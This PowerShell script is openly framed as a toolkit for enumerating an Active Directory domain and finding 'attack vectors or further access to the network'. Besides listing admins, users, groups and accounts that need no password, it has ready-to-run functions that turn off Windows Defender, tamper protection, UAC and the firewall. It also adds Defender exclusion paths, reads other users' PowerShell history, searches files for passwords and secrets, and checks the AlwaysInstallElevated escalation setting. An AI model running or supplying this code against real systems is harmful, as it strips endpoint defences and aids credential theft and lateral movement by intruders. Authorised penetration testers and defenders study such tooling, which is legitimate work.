# Powershell script for enumerating AD
# Created by Gnome787

<# 
Find information about a domain including:
* IP addresses
* Domain name
* Any connected systems
#>

function Get-Basics{
    # Define optional parameters
    param(
        [Parameter(Mandatory = $false)] [bool[]]$IPAddress,
        [Parameter(Mandatory = $false)] [bool[]]$DomainInformation,
        [Parameter(Mandatory = $false)] [bool[]]$ConnectSystems
    )
    # Get IPs
    $IPs = Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias | Out-String
    # Get domain information
    $DomainInfo = Get-ComputerInfo | Select-Object CsDomain, CsName, WindowsProductName, OsServerLevel, CsDomainRole | Format-Table | Out-String
    # Get connected systems
    $ConnectedSys = Get-ADComputer -Filter * -Properties * | Select-Object Name, IPv4Address, LastLogonDate, Enabled | Out-String
    # Prints
    if ($IPAddress -eq $true){
        Write-Host "IP Address" -ForegroundColor Black -Backgroundcolor Magenta
        Write-Host $IPs
    }
    if ($DomainInformation -eq $true){
        Write-Host "Domain Information" -ForegroundColor Black -Backgroundcolor Magenta
        Write-Host $DomainInfo
    }
    if ($ConnectSystems -eq $true){
        Write-Host "Connected Machines" -ForegroundColor Black -Backgroundcolor Magenta
        Write-Host $ConnectedSys
    }
    if (($IPAddress -ne $true) -and ($DomainInformation -ne $true) -and ($ConnectSystems -ne $true)){
        Write-Host "IP Address" -ForegroundColor Black -Backgroundcolor Magenta
        Write-Host $IPs
        Write-Host "Domain Information" -ForegroundColor Black -Backgroundcolor Magenta
        Write-Host $DomainInfo
        Write-Host "Connected Machines" -ForegroundColor Black -Backgroundcolor Magenta
        Write-Host $ConnectedSys
    }
}


function Get-Listening{
    # Get listening ports
    $Listening = Get-NetTCPConnection | Where-Object -Property State -Match Listen
    $Ports = $Listening | Where-Object -Property LocalAddress -ne "::" | Where-Object -Property LocalAddress -ne "::1"
    $PortsFormatted = $Ports | Select Local*, Remote*, State, @{n="ProcessName";e={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table | Out-String
    # Print
    Write-Host "Listening Ports" -ForegroundColor Black -Backgroundcolor Magenta
    Write-Host $PortsFormatted
}

<#
Find information about domain objects including
* Admins
* OUs
* Groups
* Users
#>

# Retrieve all admins in the domain
function Get-Admins{
    # Retrieve Administrators
    $ATs = Get-ADGroupMember -Identity "Administrators" | Select-Object -Property Name, SamAccountName, SID | Out-String
    # Retrieve Domain Admins
    $DAs = Get-ADGroupMember -Identity "Domain Admins" | Select-Object -Property Name, SamAccountName, SID | Out-String
    # Retrieve enterprise admins
    $EAs = Get-ADGroupMember -Identity "Enterprise Admins" | Select-Object -Property Name, SamAccountName, SID | Out-String
    # Prints
    Write-Host "Administrators" -ForegroundColor Black -Backgroundcolor Magenta
    Write-Host $ATs
    Write-Host "Domain Admins" -ForegroundColor Black -Backgroundcolor Magenta
    Write-Host $DAs
    Write-Host "Enterprise Admins" -ForegroundColor Black -Backgroundcolor Magenta
    Write-Host $EAs
}

# Retrieve all OUs in the domain
function Get-OUs{
    $OUs = Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName,ObjectGUID | Out-String
    # Print
    Write-Host "Organisational Units" -ForegroundColor Black -Backgroundcolor Magenta
    Write-Host $OUs
}

function Get-AllGroups{
    # Get groups
    $Groups = Get-ADGroup -Filter * -Properties * | Select-Object SamAccountName, Member | Where-Object Member -ne "" | Out-String
    # Print
    Write-Host "All Groups" -ForegroundColor Black -Backgroundcolor Magenta
    Write-Host $Groups
}


function Get-AllUsers{
    # TODO - This function needs to be modified massively to accomodate a more granular search of users
    # Get all users
    $Users = Get-ADUser -Filter * -Properties * | Select-Object Name, DistinguishedName, SamAccountName, PrimaryGroup | Out-String 
    #Print
    Write-Host "Domain Users" -ForegroundColor Black -Backgroundcolor Magenta
    Write-Host $Users 
}   

<# 
Tools for finding potential attack vectors or further access to the network
#>
function Get-NoPass{
    # Get users that don't require a password
    $NoPass = Get-ADUser -Filter * -Properties * | Where-Object PasswordNotRequired -eq True | Select-Object Name, SamAccountName, DistinguishedName, PasswordNotRequired | Out-String
    #Print
    Write-Host "Accounts that don't require a password" -ForegroundColor Black -Backgroundcolor Red
    Write-Host $NoPass
}

function Get-History{
    # Ask for which user to get the powershell history for
    Write-Host "Account name for user you want powershell history for: " -ForegroundColor Black -Backgroundcolor Green -NoNewLine
    $Username = Read-Host
    Get-Content -Path C:\Users\$Username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
}

function Disable-Defender{

    $DefenderEnabled = $true

    while($DefenderEnabled -eq $true){
        # Check if defender is enabled
        $Defenderon = (Get-MpComputerStatus).AntivirusEnabled
        if($Defenderon -eq $true){
            Write-Host "Windows defender is active, attempting to disable defender!" -ForegroundColor Black -Backgroundcolor Red
        }
        else{
            Write-Host "Windows defender is inactive, no further action required!" -ForegroundColor Black -Backgroundcolor Green
            break
        }

        # Check if tamper protection is enabled
        $Defendertamper = (Get-MpComputerStatus).IsTamperProtected
        if($Defendertamper -eq $true){
            Write-Host "Tamper protection is enabled, unable to disable defender." -ForegroundColor Black -Backgroundcolor Red
            break
        }
        else{
            Write-Host "Tamper protection disabled, attempting to disable defender!" -ForegroundColor Black -Backgroundcolor Green
        }

        # Disable defender
        $params = @{
            DisableRealtimeMonitoring = $true
            DisableIOAVProtection = $true
            DisableBehaviorMonitoring = $true
            DisableBlockAtFirstSeen = $true
            DisableEmailScanning = $true
            DisableScriptScanning = $true
            ExclusionPath = "ps1"
        }
        Set-MpPreference @params

        # Add a folder exclusion
        $Path = "C:\Windows\Temp"
        Add-MpPreference -ExclusionPath $Path

        # Print completed
        Write-Host "Windows defender disabled. Exclusion path set to $Path!" -ForegroundColor Black -Backgroundcolor Green
        break
    }
} 

function Add-DefenderExclusion{

    param(
        [Parameter(Mandatory = $true)] $Path
    )
    # Add exclusion to specified path
    Add-MpPreference -ExclusionPath $Path -ea SilentlyContinue -ErrorVariable ExclusionPathError

    if($ExclusionPathError){
        Write-Host "Unable to add an exclusion path! Insufficient permissions." -ForegroundColor Black -Backgroundcolor Red
    }
    else{
        Write-Host "Defender exclusion path added @ $Path." -ForegroundColor Black -Backgroundcolor Green
    }
}

function Disable-TamperProtection{
    $RegistryPath = "HKLM:SOFTWARE\Microsoft\Windows Defender\Features"
    $Name = "TamperProtection"
    $Value = 0

    New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType DWORD -Force -ea SilentlyContinue

    $TamperProperty = (Get-ItemProperty -Path $RegistryPath -Name $Name).TamperProtection

    if($TamperProperty -eq 0){
        Write-Host "Tamper protection disabled!" -ForegroundColor Black -Backgroundcolor Green
    }
    else{
        Write-Host "Unable to disable tamper protection! Insufficient permissions." -ForegroundColor Black -Backgroundcolor Red
    }
}

function Disable-UAC{
    # Disable UAC
    Write-Host "Attempting to disable UAC..." -ForegroundColor Black -Backgroundcolor Magenta
    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -ea SilentlyContinue -ErrorVariable UACError
    
    if($UACError){
        Write-Host "Unable to disable UAC! Insufficient permissions." -ForegroundColor Black -Backgroundcolor Red
    }
    else{
        Write-Host "UAC disabled!" -ForegroundColor Black -Backgroundcolor Green
    }
}

function Disable-Firewall{
    Write-Host "Disabling firewall requires administrative privileges!" -ForegroundColor Yellow -Backgroundcolor Black
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -EA SilentlyContinue -ErrorVariable FirewallError

    if($FirewallError){
        Write-Host "Unable to disable firewall! Insufficient permissions." -ForegroundColor Black -Backgroundcolor Red
    }
    else{
        Write-Host "Firewall disabled!" -ForegroundColor Black -Backgroundcolor Green
    }
}

function Get-Passwords{

    param(
        [Parameter(Mandatory = $true)] [string[]]$Path
    )
    # Find passwords by searching the specified directory
    ls -Path $Path -R | select-string -Pattern password, secret, credential
}

function Get-AlwaysInstallElevated{
    $AIE1 = Get-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue -ErrorVariable HKLMError
    $AIE2 = Get-ItemProperty -Path HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue -ErrorVariable HKCUError

    $AIE1 = $AIE1.AlwaysInstallElevated
    $AIE2 = $AIE2.AlwaysInstallElevated

    if($HKLMError){
        Write-Host "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated is not set!" -ForegroundColor Black -Backgroundcolor Red
    }
    else{
        Write-Host "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated is set to $AIE1" -ForegroundColor Black -Backgroundcolor Green
    }
    if($HKCUError){
        Write-Host "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated is not set!" -ForegroundColor Black -Backgroundcolor Red
    }
    else{
        Write-Host "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated is set to $AIE2" -ForegroundColor Black -Backgroundcolor Green
    }
}
